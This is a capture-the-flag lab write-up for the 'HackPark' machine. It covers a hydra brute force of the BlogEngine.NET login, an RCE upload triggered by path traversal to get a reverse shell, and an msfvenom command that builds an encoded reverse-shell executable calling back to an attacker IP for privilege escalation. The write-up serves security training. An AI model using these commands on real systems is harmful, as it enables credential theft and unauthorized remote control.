---
title: "HackPark"
description: "Enum Nmap : Port 80 we found login menu, let’s we find out what we can do BruteForce Login Page Bruteforce login page using hydra get valid credential admin : 1qaz2wsx then we use"
lang: "en"
translationKey: "hackpark"
category: "lab-writeups"
tags: ["Lab", "BlogEngine.NET 3360", "systemscheduler", "Windows"]
publishDate: "2024-12-16"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "15e5fca1-ed80-8023-ba8b-c7a97148b0dd"
notionUrl: "https://app.notion.com/p/HackPark-15e5fca1ed808023ba8bc7a97148b0dd"
notionLastEdited: "2025-02-12T14:19:00.000Z"
---

# Enum

Nmap :

![](/images/hackpark/9c524c7b71c2.png)

![](/images/hackpark/6b61e1fb7431.png)

## Port 80

![](/images/hackpark/631bcf3c1e45.png)

we found login menu, let’s we find out what we can do 

![](/images/hackpark/947a7226573e.png)

![](/images/hackpark/ebe44f71e79f.png)

### BruteForce Login Page

Bruteforce login page using hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.181.40 http-post-form "/Account/login.aspx?ReturnURL=admin:__VIEWSTATE=ZOzgyCyA64COi2GxTzmIsi2e3pb7uf7bluc%2BrqvdhIpLa3Yupd7Rw7spsz1A1yORUZ77%2B4Ny70%2B%2F86279EENAMYER7r8w7xbek%2FgL6RKt7UUdBM4yRX1UC5bpOHo5ixGfxDnw0GSJJrlo4a3hB7VKR73zKmUvm2%2BLHGSmJw17uynLazn&__EVENTVALIDATION=aQJsBagSpf0bvfn7iSJYgD8yykWOtsD8Y%2B5J5RUhah4GOtUc6AOrX%2FhEnuPssqBbmxiQK6zDev0eokRecrBJ9OvWj772L7SN0utBdxGqAZGy1zNyN%2Fyd3Ma1rEOBntiI0bQc21nkansi3nUvZDTdS8mB0TkZGDBEqKVI8yaQvDTWubEW&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

![](/images/hackpark/c25f9f582443.png)

get valid credential `admin : 1qaz2wsx` then we use it for login

![](/images/hackpark/06f4aa4181c0.png)

After login we try to exploit the application based on the version of the application

![](/images/hackpark/cdbacea60c44.png)

googling

![](/images/hackpark/144e293832bb.png)

### Exploit [BlogEngine.NET](http://blogengine.net/) 3.3.6.0

Referensi : [https://www.aon.com/cyber-solutions/aon_cyber_labs/remote-code-execution-in-blogengine-net/](https://www.aon.com/cyber-solutions/aon_cyber_labs/remote-code-execution-in-blogengine-net/)

first upload file exploit become a **PostView.ascx **via file manager on edit post

![](/images/hackpark/f0be785e8baa.png)

![](/images/hackpark/f82b5cf49155.png)

then upload the file which has been uploaded by accessing this path [`http://10.10.181.40/?theme=../../App_Data/files`](http://10.10.181.40/?theme=..%2F..%2FApp_Data%2Ffiles) and catch the reverse shell

![](/images/hackpark/963fb5b6fcd5.png)

![](/images/hackpark/ceffb63d5b6a.png)

# WinPriv

Referensi : [https://www.secjuice.com/thm-hack-park/](https://www.secjuice.com/thm-hack-park/)

winpeas :

![](/images/hackpark/1d19de8e85bd.png)

setelah melakukan penelusuran pada directory terkait, kami menemukan file log yang berisikan seperti berikut.

![](/images/hackpark/b4bd9e9ef2d4.png)

so let’s we check weather we have modify permission or not

![](/images/hackpark/0bcf8299a226.png)

oke we got modify access, then let’s change the file with our malicious file.

```bash
#generate malicious file using msfvenom
msfvenom -p windows/shell_reverse_tcp --encoder x86/shikata_ga_nai LHOST=10.9.4.211 LPORT=4444 -f exe -o shell-name.exe
```

![](/images/hackpark/bb076cbb741f.png)

![](/images/hackpark/c6591645f588.png)

![](/images/hackpark/d24246ee8d97.png)

# Submit Flag user & root

![](/images/hackpark/81a06cf45ed5.png)

![](/images/hackpark/9ea685c48e01.png)
